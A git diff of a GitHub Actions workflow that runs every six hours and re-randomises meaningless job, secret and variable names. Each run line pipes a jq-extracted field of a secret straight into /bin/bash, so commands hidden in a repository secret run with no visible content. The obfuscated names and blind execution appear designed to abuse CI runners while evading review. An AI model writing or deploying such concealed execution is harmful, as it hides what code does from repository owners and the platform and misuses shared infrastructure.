@@ -1,30 +1,31 @@
 name: huanglongxing1987
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '5 5/6 * * *'
-
-jobs:  # 20521
+    - cron: '47 0/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: huanglongxing1987
         env:
-          noj90: ${{ secrets.noj90 }}
+          gt016: ${{ secrets.gt016 }}
         run: |
-          echo $noj90 | jq -r .o25 | /bin/bash
-          echo $b6830 | jq -r .gtxo884 | /bin/bash
-          echo $wefn4 | jq -r .poe68062 | /bin/bash
-          echo $lq16210 | jq -r .eut53 | /bin/bash
-          echo $ohzc26 | jq -r .cgsr9477 | /bin/bash
-          echo $bqrm13 | jq -r .utqw466 | /bin/bash
-          echo $dilt28911 | jq -r .sl19674 | /bin/bash
-          echo $ajr5615 | jq -r .z836 | /bin/bash
-          echo $js3075 | jq -r .q5 | /bin/bash
-          echo $zbgn8932 | jq -r .q3 | /bin/bash
-          echo $htyg0 | jq -r .hik8175 | /bin/bash
-          echo $yfnzc6839 | jq -r .atu0558 | /bin/bash
-          echo $s4 | jq -r .i01752 | /bin/bash
-          echo $ayy30900 | jq -r .zr1 | /bin/bash
+          echo $gt016 | jq -r .wgjxz29 | /bin/bash
+          echo $inaph65 | jq -r .sppou1 | /bin/bash
+          echo $c96076 | jq -r .n9 | /bin/bash
+          echo $dgt43586 | jq -r .gtldk73918 | /bin/bash
+          echo $br783 | jq -r .hzir8 | /bin/bash
+          echo $y9 | jq -r .grnsi4 | /bin/bash
+          echo $wpkfs2587 | jq -r .viam04384 | /bin/bash
+          echo $ikh75149 | jq -r .sas7779 | /bin/bash
+          echo $zo0594 | jq -r .bzwv0 | /bin/bash
+          echo $jde46 | jq -r .nkei4807 | /bin/bash
+          echo $isk922 | jq -r .n40 | /bin/bash
+          echo $r60 | jq -r .ktbab6917 | /bin/bash
+          echo $mf5890 | jq -r .y2111 | /bin/bash
+          echo $kc36816 | jq -r .lc4 | /bin/bash
+          echo $vnpr3 | jq -r .wlraw858 | /bin/bash
 
